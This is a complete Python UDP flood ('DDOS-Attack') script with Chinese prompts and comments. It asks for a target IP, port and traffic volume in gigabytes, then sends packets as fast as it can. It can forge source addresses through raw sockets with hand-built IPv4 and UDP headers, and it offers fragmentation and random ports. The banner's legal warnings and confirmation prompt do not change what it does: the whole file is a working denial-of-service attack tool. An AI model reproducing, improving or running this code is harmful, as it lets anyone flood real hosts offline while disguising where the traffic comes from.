#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import os
import time
import socket
import ipaddress
import random
import struct
import platform


# ==================== 跨平台清屏 ====================
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


# ==================== 校验和计算 ====================
def ip_checksum(data: bytes) -> int:
    """
    标准 16-bit 反码校验和（RFC 1071）。
    用于 IP 头或 UDP 伪头 + UDP 头 + 载荷。
    """
    if len(data) % 2:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i + 1]
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF


def udp_checksum(src_ip: str, dst_ip: str, udp_header: bytes, payload: bytes) -> int:
    """
    UDP 校验和：需要伪头（src + dst + zero + proto + udp_len）。
    udp_header 传入时 checksum 字段必须为 0。
    """
    pseudo = (socket.inet_aton(src_ip) +
              socket.inet_aton(dst_ip) +
              b'\x00\x11' +
              struct.pack('!H', len(udp_header) + len(payload)))
    result = ip_checksum(pseudo + udp_header + payload)
    # UDP 校验和 0 表示"不校验"，接收方会跳过；
    # 为避免被防火墙/conntrack 丢弃，结果为 0 时改为 0xFFFF。
    return result if result != 0 else 0xFFFF


# ==================== 本地网络探测 ====================
def get_local_ip_and_subnet():
    """
    通过 UDP connect 探测定本地出口 IP（不实际发包）。
    返回 (ip_str, ip_network)，失败返回 (None, None)。
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0.1)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        # 假设 /24，这是最保守的估计；精确子网需要 netifaces 等库
        net = ipaddress.ip_network(f"{local_ip}/24", strict=False)
        return local_ip, net
    except Exception:
        return None, None


# ==================== 伪造 IP 合法性检查 ====================
def validate_spoof_ip(spoof_ip: str, target_ip: str, local_net) -> tuple:
    """
    返回 (is_valid, message)。
    message 可能为 Warning（依然允许发送）或拒绝原因。
    """
    try:
        s = ipaddress.ip_address(spoof_ip)
        t = ipaddress.ip_address(target_ip)
    except ValueError:
        return False, "无效的 IP 地址"

    if not isinstance(s, ipaddress.IPv4Address):
        return False, "仅支持 IPv4 伪造"

    if s.is_loopback:
        return False, f"拒绝伪造 {spoof_ip}：回环地址 (127.0.0.0/8)"
    if s.is_multicast:
        return False, f"拒绝伪造 {spoof_ip}：组播地址 (224.0.0.0/4)"
    if s.is_unspecified:
        return False, f"拒绝伪造 {spoof_ip}：0.0.0.0 无意义"
    if s.is_reserved:
        return False, f"拒绝伪造 {spoof_ip}：保留地址 (240.0.0.0/4)"
    if s.is_link_local:
        return False, f"拒绝伪造 {spoof_ip}：链路本地地址 (169.254.0.0/16)"
    if s == t:
        return False, f"拒绝伪造：伪造 IP 不能等于目标 IP"
    if s.is_private and local_net and s not in local_net:
        return True, (f"警告：{spoof_ip} 是私有地址但不在本机子网 {local_net}，"
                      f"跨路由伪造会被上游 uRPF 过滤，实际可能无效")

    if local_net and s not in local_net:
        return True, (f"警告：{spoof_ip} 不在本机子网 {local_net} 内，"
                      f"跨路由伪造会被上游 uRPF 过滤，实际可能无效")

    return True, f"OK：{spoof_ip} 在本机子网 {local_net} 内（最佳场景）"


# ==================== 构造 IP + UDP 包 ====================
def build_ip_udp_packet(spoof_ip: str, target_ip: str,
                        src_port: int, dst_port: int,
                        payload: bytes, ttl: int = 64) -> bytes:
    """
    完整构造带正确校验和的 IPv4 + UDP 包。
    DF 位强制开启（不分片），因此 payload 长度必须 ≤ 1472。
    """
    ip_header_len = 20
    udp_header_len = 8
    total_len = ip_header_len + udp_header_len + len(payload)

    # IP 头字段
    ip_ver_ihl = 0x45                      # IPv4, IHL=5 (20 bytes)
    ip_tos = 0
    ip_id = random.randint(0, 0xFFFF)
    ip_frag_off = 0x4000                   # DF=1, MF=0, offset=0
    ip_ttl = ttl
    ip_proto = socket.IPPROTO_UDP
    ip_saddr = socket.inet_aton(spoof_ip)
    ip_daddr = socket.inet_aton(target_ip)

    # 第一次：checksum=0，算出来
    ip_header = struct.pack('!BBHHHBBH4s4s',
                            ip_ver_ihl, ip_tos, total_len,
                            ip_id, ip_frag_off,
                            ip_ttl, ip_proto, 0,
                            ip_saddr, ip_daddr)
    ip_check = ip_checksum(ip_header)

    # 第二次：填入正确 checksum
    ip_header = struct.pack('!BBHHHBBH4s4s',
                            ip_ver_ihl, ip_tos, total_len,
                            ip_id, ip_frag_off,
                            ip_ttl, ip_proto, ip_check,
                            ip_saddr, ip_daddr)

    # UDP 头
    udp_len = udp_header_len + len(payload)
    udp_header = struct.pack('!HHHH', src_port, dst_port, udp_len, 0)
    udp_check = udp_checksum(spoof_ip, target_ip, udp_header, payload)
    udp_header = struct.pack('!HHHH', src_port, dst_port, udp_len, udp_check)

    return ip_header + udp_header + payload


# ==================== 普通模式：TCP 连通性检查 ====================
def check_target(ip: str, port: int, timeout: float = 1.0) -> bool:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.close()
        return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


# ==================== 启动画面 ====================
def show_banner():
    clear_screen()
    print("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   Sucodesu")
    print("M       MMM M       MMM MMM     MMM MM       MM   Sucodesu")
    print("M  MMMM   M M  MMMM   M M   MMM   M M  MMMMM  M   Sucodesu")
    print("M  MMMMM  M M  MMMMM  M M  MMMMM  M M        MM   Sucodesu")
    print("M  MMMMM  M M  MMMMM  M M  MMMMM  M MMMMMMM   M   Sucodesu")
    print("M  MMMM   M M  MMMM   M M   MMM   M M   MMM   M   Sucodesu")
    print("M        MM M        MM MMM     MMM MM       MM   Sucodesu")
    print("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   Sucodesu")
    print("======================= 严重警告 =========================")
    print("你正在跨越法律和道德的边界。请立即退出，或等待 3 秒后启动。")
    print("仅限你拥有完全控制权的隔离实验环境。")
    print("=========================================================")
    time.sleep(1)
    print("3"); time.sleep(1)
    print("2"); time.sleep(1)
    print("1"); time.sleep(1)
    print("Starting...")
    time.sleep(1)

    clear_screen()
    ret = os.system("figlet DDOS-Attack 2>/dev/null" if os.name != 'nt' else "figlet DDOS-Attack 2>nul")
    if ret != 0:
        print(r" ____  ____   ___  ____          _   _   _             _     ")
        print(r"|  _ \|  _ \ / _ \/ ___|        / \ | |_| |_ __ _  ___| | __ ")
        print(r"| | | | | | | | | \___ \ _____ / _ \| __| __/ _` |/ __| |/ / ")
        print(r"| |_| | |_| | |_| |___) |_____/ ___ \ |_| || (_| | (__|   <  ")
        print(r"|____/|____/ \___/|____/     /_/   \_\__|\__\__,_|\___|_|\_\ ")    
    print("====================================================================")
    print("Author  : Su-StackTrace")
    print("GitHub  : https://github.com/BC-809/DDoS-Attack_t3g85hxb670.git")
    print("====================================================================")
    print("")


# ==================== 主程序 ====================
def main():
    show_banner()

    # ---------- 目标 IP ----------
    while True:
        try:
            ip_str = input("[?] 目标 IP 地址: ").strip()
            ipaddress.ip_address(ip_str)
            target_ip = ip_str
            break
        except ValueError:
            print("[!] 无效的 IP 地址，请重新输入")

    # ---------- 目标端口 ----------
    while True:
        try:
            port_str = input("[?] 目标端口: ").strip()
            target_port = int(port_str)
            if 1 <= target_port <= 65535:
                break
            print("[!] 端口必须在 1-65535 之间")
        except ValueError:
            print("[!] 无效的端口号")

    # ---------- 总流量 ----------
    while True:
        try:
            gb_str = input("[?] 发送总流量 (GB): ").strip()
            total_gb = float(gb_str)
            if total_gb > 0:
                break
            print("[!] 流量必须大于 0 GB")
        except ValueError:
            print("[!] 无效的数值")

    # ---------- 速率限制 ----------
    rate_limit = 0.0
    try:
        rate_str = input("[?] 发包间隔（秒，0=不限速）: ").strip()
        if rate_str:
            rate_limit = float(rate_str)
    except ValueError:
        rate_limit = 0.0

    # ---------- 伪造源 IP ----------
    print("\n--- 源 IP 模式 ---")
    print("[*] 留空 = 使用本机真实源 IP（普通 UDP）")
    print("[*] 输入 IP = 伪造该 IP（需 root / 管理员权限）")
    spoof_ip = input("[?] 伪造源 IP: ").strip()

    local_ip, local_net = get_local_ip_and_subnet()
    if local_ip:
        print(f"[>] 本机出口 IP: {local_ip}，推测子网: {local_net}")
    else:
        print("[>] 无法探测本机子网，uRPF 检查将跳过")

    if spoof_ip:
        valid, msg = validate_spoof_ip(spoof_ip, target_ip, local_net)
        if not valid:
            print(f"[!] {msg}")
            print("[!] 拒绝伪造该地址，退出")
            sys.exit(1)
        print(f"[>] {msg}")

        # 伪造模式参数
        ttl = 64
        try:
            ttl_str = input("[?] TTL (默认 64): ").strip()
            if ttl_str:
                ttl = int(ttl_str)
                if not 1 <= ttl <= 255:
                    ttl = 64
        except ValueError:
            ttl = 64

        # 强制 DF，payload 上限 1472
        PACKET_SIZE = 1472
        try:
            size_str = input("[?] 包大小（字节，默认 1472，DF 模式下最大 1472）: ").strip()
            if size_str:
                PACKET_SIZE = int(size_str)
                if PACKET_SIZE > 1472:
                    print(f"[!] DF 模式下 payload 最大 1472，已截断")
                    PACKET_SIZE = 1472
                if PACKET_SIZE < 28:
                    PACKET_SIZE = 28
        except ValueError:
            pass

        use_spoof = True
        use_fragmentation = False
        random_target_port = False
        source_port = None

        rnd = input("[?] 随机目标端口? (y/N): ").strip().lower()
        if rnd == 'y':
            random_target_port = True

        print(f"\n[>] 伪造模式：")
        print(f"    伪造源 IP : {spoof_ip}")
        print(f"    TTL        : {ttl}")
        print(f"    包大小     : {PACKET_SIZE} 字节 (DF 位已开启)")

    else:
        use_spoof = False
        ttl = 64

        src = input("[?] 指定源端口 (留空则系统随机分配): ").strip()
        source_port = int(src) if src else None

        frag = input("[?] 启用 IP 分片? (y/N): ").strip().lower()
        use_fragmentation = (frag == 'y')

        rnd = input("[?] 使用随机目标端口? (y/N): ").strip().lower()
        random_target_port = (rnd == 'y')

        PACKET_SIZE = 3000 if use_fragmentation else 1472
        print(f"\n[>] 普通模式：")
        print(f"    包大小     : {PACKET_SIZE} 字节")

    total_bytes = int(total_gb * 1024 * 1024 * 1024)
    max_packets = total_bytes // PACKET_SIZE

    # ---------- 摘要 ----------
    print(f"\n[>] 将发送 {max_packets} 个数据包，总计 {total_gb:.2f} GB")
    if rate_limit > 0:
        print(f"[>] 发包间隔: {rate_limit} 秒")
    if use_spoof:
        print(f"[>] 原始套接字模式（需要 root / 管理员权限）")
    else:
        print(f"[>] 普通 UDP 模式")
    if random_target_port:
        print(f"[>] 随机目标端口: 启用")

    # ---------- 连通性检查（仅普通模式） ----------
    if not use_spoof:
        print("[>] 检查目标连通性 (TCP)...")
        if not check_target(target_ip, target_port):
            print("[!] 目标 TCP 不可达（注意：TCP 可达 ≠ UDP 可达）")
            choice = input("[?] 仍要继续? (y/N): ").strip().lower()
            if choice != 'y':
                print("[>] 用户取消")
                sys.exit(0)

    # ---------- 最终确认 ----------
    print("\n[!] 最后警告：你即将发送大量 UDP 流量。")
    print("[!] 请确认这是你拥有完全授权的隔离设备。")
    confirm = input("[?] 确认 (yes/no): ").strip().lower()
    if confirm != 'yes':
        print("[>] 用户取消")
        sys.exit(0)

    # ---------- 创建套接字 ----------
    if use_spoof:
        if platform.system() == "Windows":
            print("[>] Windows 下原始套接字需要管理员权限")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        except PermissionError:
            print("[!] 创建原始套接字失败，请用 sudo / root / 管理员权限运行")
            sys.exit(1)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    else:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        if source_port is not None:
            try:
                sock.bind(('', source_port))
            except OSError as e:
                print(f"[!] 无法绑定源端口 {source_port}: {e}")
                sock.close()
                sys.exit(1)
        if use_fragmentation:
            try:
                if hasattr(socket, 'IP_MTU_DISCOVER'):
                    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MTU_DISCOVER, socket.IP_PMTUDISC_DO)
                    if hasattr(socket, 'IP_DONTFRAGMENT'):
                        sock.setsockopt(socket.IPPROTO_IP, socket.IP_DONTFRAGMENT, 0)
            except (AttributeError, OSError) as e:
                print(f"[!] 启用分片失败 ({e})，改用普通模式")
                PACKET_SIZE = 1472
                total_bytes = int(total_gb * 1024 * 1024 * 1024)
                max_packets = total_bytes // PACKET_SIZE

    payload = os.urandom(PACKET_SIZE)
    sent = 0
    sent_bytes = 0
    next_mb = 1024 * 1024
    start_time = time.time()

    print(f"\n[>] 开始发送... (Ctrl+C 停止)")

    try:
        while sent < max_packets:
            if random_target_port:
                current_port = random.randint(1, 65535)
            else:
                current_port = target_port

            try:
                if use_spoof:
                    src_port = source_port if source_port else random.randint(1024, 65535)
                    packet = build_ip_udp_packet(
                        spoof_ip, target_ip,
                        src_port, current_port,
                        payload, ttl
                    )
                    # IP_HDRINCL 下端口被忽略，传 0 更严谨
                    sock.sendto(packet, (target_ip, 0))
                else:
                    sock.sendto(payload, (target_ip, current_port))

                sent += 1
                sent_bytes += PACKET_SIZE

                if not random_target_port and not use_spoof:
                    target_port += 1
                    if target_port > 65534:
                        target_port = 1

            except OSError as e:
                print(f"[!] 发送错误: {e}")

            if sent_bytes >= next_mb:
                elapsed = time.time() - start_time
                pps = sent / elapsed if elapsed > 0 else 0
                mb = sent_bytes / (1024 * 1024)
                print(f"[>] 已发送: {sent} 包 ({mb:.2f} MB) | 用时: {elapsed:.1f}s | 速率: {pps:.1f} pps")
                next_mb += 1024 * 1024

            if rate_limit > 0:
                time.sleep(rate_limit)

    except KeyboardInterrupt:
        print("\n[!] 用户手动停止")
    except Exception as e:
        print(f"\n[!] 错误: {e}")
    finally:
        sock.close()
        elapsed = time.time() - start_time
        print(f"\n[>] 发送完成。总包数: {sent}, 总数据量: {sent_bytes / (1024*1024):.2f} MB, 用时: {elapsed:.2f} 秒")


if __name__ == "__main__":
    main()
